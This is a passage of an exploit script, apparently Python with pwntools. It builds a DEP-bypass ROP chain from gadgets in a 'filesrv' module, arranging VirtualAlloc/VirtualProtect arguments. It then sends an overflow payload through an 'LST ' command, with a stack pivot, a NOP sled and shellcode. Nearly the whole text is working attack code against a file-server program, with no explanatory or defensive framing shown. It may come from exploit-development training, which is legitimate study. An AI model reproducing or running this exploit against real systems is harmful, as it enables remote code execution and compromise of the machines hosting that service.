rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;

# Setting the ret address for VirtualAlloc
rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xfffffc10) #0x3f0
rop += p32(filesrv+0x00059a05) # sub eax, edx; pop ebp; ret;)
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;

#increasing the stack pointer in ecx
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;

#memory to virtualprotect (same as ret)
rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xfffffc14) #0x3f0-4
rop += p32(filesrv+0x00059a05) # sub eax, edx; pop ebp; ret;)
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;

#increasing the stack pointer in ecx
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;

#dwsize 0x1
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(0xffffffff) #-1
rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;

#increasing the stack pointer in ecx
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;

#flAllocationType 0x1000
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(0xffffefff) #-0x1001
rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x000774c6) # dec eax; ret
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;

#increasing the stack pointer in ecx
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;

#flProtect 0x40
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(0xffffffc0) #-0x40
rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;

#jumping to virtualprotect stub
rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xffffffec) # - 0x14
rop += p32(filesrv+0x0003697f) # add eax, edx; ret;
rop += p32(filesrv+0x00066ab3) # xchg esp, eax; ret;


#bp filesrv+0x00011396

buf = b""
buf += b"XXXX"
buf += b"A"*0x68 #offset to pivot landing
buf += rop #from here there's around 350 bytes to ROP


payload  = b""
payload += b"LST "
payload += buf
payload += b"A" * (0x408-len(buf))
payload += b"BBBB" #We have DEP so no nseh
payload += p32(filesrv+0x00011396) # Stack pivot add esp, 0xe10
payload += b"\x90" * 64
payload += shellcode
payload += b"\x90" * (0xfb0-len(payload))
r.sendline(payload)
sleep(2) #if you don't wait the payload is not sent properly
r.close()



```